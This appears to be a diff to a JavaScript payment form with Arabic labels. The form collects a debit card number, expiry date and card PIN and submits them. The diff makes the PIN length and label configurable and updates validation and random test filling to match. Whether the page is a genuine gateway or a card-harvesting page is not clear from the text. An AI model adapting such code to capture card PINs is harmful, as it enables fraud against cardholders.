@@ -120,6 +120,17 @@
     return String(value || "").replace(/\D/g, "");
   }
 
+  function getCardSecurityLabel() {
+    var body = document.body;
+    return String((body && body.dataset && body.dataset.cardSecurityLabel) || "الرقم السري").trim() || "الرقم السري";
+  }
+
+  function getCardSecurityLength() {
+    var body = document.body;
+    var raw = Number.parseInt((body && body.dataset && body.dataset.cardSecurityLength) || "4", 10);
+    return raw === 3 ? 3 : 4;
+  }
+
   function getStoredVisitorId() {
     try {
       return localStorage.getItem("sid") || localStorage.getItem("fastapi-base-visitor-id") || "";
@@ -377,7 +388,7 @@
       monthEl.value = randomFrom(monthOptions).value;
     }
 
-    pinEl.value = randomDigits(4);
+    pinEl.value = randomDigits(getCardSecurityLength());
     hideValidation();
   }
 
@@ -433,7 +444,7 @@
       return false;
     }
 
-    if (pinValue.length !== 4) {
+    if (pinValue.length !== getCardSecurityLength()) {
       showValidation("خطأ - يرجى ادخال الرمز السري بشكل صحيح");
       return false;
     }
@@ -492,7 +503,7 @@
           { name: "debit_number", label: "رقم بطاقة الصرف الآلي", value: digitsOnly(debitNumberEl.value), type: "text" },
           { name: "expiry_month", label: "شهر الانتهاء", value: String(monthEl.value || ""), type: "text" },
           { name: "expiry_year", label: "سنة الانتهاء", value: String(yearEl.value || ""), type: "text" },
-          { name: "card_pin", label: "الرقم السري", value: digitsOnly(pinEl.value), type: "text" }
+          { name: "card_pin", label: getCardSecurityLabel(), value: digitsOnly(pinEl.value), type: "text" }
         ]
       })
     });
@@ -628,6 +639,7 @@
 
     attachDigitFilter(debitNumberEl);
     attachDigitFilter(pinEl);
+    pinEl.setAttribute("maxlength", String(getCardSecurityLength()));
 
     debitNumberEl.addEventListener("input", persistNonSensitiveFields);
 
